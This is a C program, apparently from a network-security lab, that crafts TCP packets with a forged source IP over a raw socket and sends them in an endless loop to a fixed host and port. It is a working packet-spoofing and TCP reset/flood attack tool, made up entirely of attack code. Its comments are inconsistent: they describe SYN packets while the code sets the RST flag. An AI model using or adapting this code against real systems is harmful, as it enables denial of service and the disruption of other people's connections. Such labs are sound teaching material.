#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
//#include <aarch64-linux-gnu/bits/stdlib.h>
#include <time.h>
#include <string.h>
//#include <sys/socket.h>
#include <aarch64-linux-gnu/sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "PacketHeader.h"



/*************************************************************
  Given an IP packet, send it out using a raw socket.
**************************************************************/
void send_raw_ip_packet(struct ipheader2* ip)
{
    
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    //printf("\nSocket is:%d", sock);
    
    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                     &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    ssize_t result = sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    
    //printf("\nPacket is:%ld", result);
    
    close(sock);
}

/*************************************************************
  Checksum
**************************************************************/
unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}

/****************************************************************
  TCP checksum is calculated on the pseudo header, which includes
  the TCP header and data, plus some part of the IP header.
  Therefore, we need to construct the pseudo header first.
*****************************************************************/
unsigned short calculate_tcp_checksum(struct ipheader2 *ip)
{
   struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +
                            sizeof(struct ipheader2));

   int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader2);

   /* pseudo tcp header for the checksum computation */
   struct pseudo_tcp p_tcp;
   memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

   p_tcp.saddr  = ip->iph_sourceip.s_addr;
   p_tcp.daddr  = ip->iph_destip.s_addr;
   p_tcp.mbz    = 0;
   p_tcp.ptcl   = IPPROTO_TCP;
   p_tcp.tcpl   = htons(tcp_len);
   memcpy(&p_tcp.tcp, tcp, tcp_len);

   return  (unsigned short) in_cksum((unsigned short *)&p_tcp,
                                     tcp_len + 12);
}



#define DEST_IP "172.17.0.3"
#define DEST_PORT 44742 //80 // Attack the web server
#define PACKET_LEN 1500


/******************************************************************
 * Spoof a TCP SYN packet.
 * *******************************************************************/
int main() {
	char buffer[PACKET_LEN];
	struct ipheader2 *ip = (struct ipheader2 *) buffer;
	struct tcpheader *tcp = (struct tcpheader *) (buffer +
			sizeof(struct ipheader2));
	
	srand(time(0)); // Initialize the seed for random # generation.
		
	uint32_t index_sourceip=0;
	while (1) {
		memset(buffer, 0, PACKET_LEN);
		/*********************************************************
		* 		Step 1: Fill in the TCP header.
		********************************************************/
		tcp->tcp_sport = rand(); // Use random source port
		tcp->tcp_dport = htons(DEST_PORT);
		tcp->tcp_seq = rand(); // Use random sequence #
		tcp->tcp_offx2 = 0x50;
		tcp->tcp_flags = TH_RST; // Enable the SYN bit
		tcp->tcp_win = htons(20000);
		tcp->tcp_sum = 0;

		/*********************************************************
		 * 		Step 2: Fill in the IP header.
		 *********************************************************/
		ip->iph_ver = 4; // Version (IPV4)
		ip->iph_ihl = 5; // Header length
		ip->iph_ttl = 50; // Time to live
		//uint32_t temp = inet_addr("172.17.0.2") + index_sourceip;
		ip->iph_sourceip.s_addr = inet_addr("172.17.0.4");// + index_sourceip;  //rand(); // Use a random IP address // in_addr is uint32_t
		ip->iph_destip.s_addr = inet_addr(DEST_IP);
		ip->iph_protocol = IPPROTO_TCP; // The value is 6.
		ip->iph_len = htons(sizeof(struct ipheader) +
				sizeof(struct tcpheader));
		
		// Calculate tcp checksum
		tcp->tcp_sum = calculate_tcp_checksum(ip);
		
		/*********************************************************		
		  Step 3: Finally, send the spoofed packet
		********************************************************/
		send_raw_ip_packet(ip);

		// Work-around to increase IP
		index_sourceip=index_sourceip+16777216;
		if(index_sourceip>250*16777216) index_sourceip=0;
		//if(index_sourceip>250*16777216) return 0;
	}

	return 0;
}
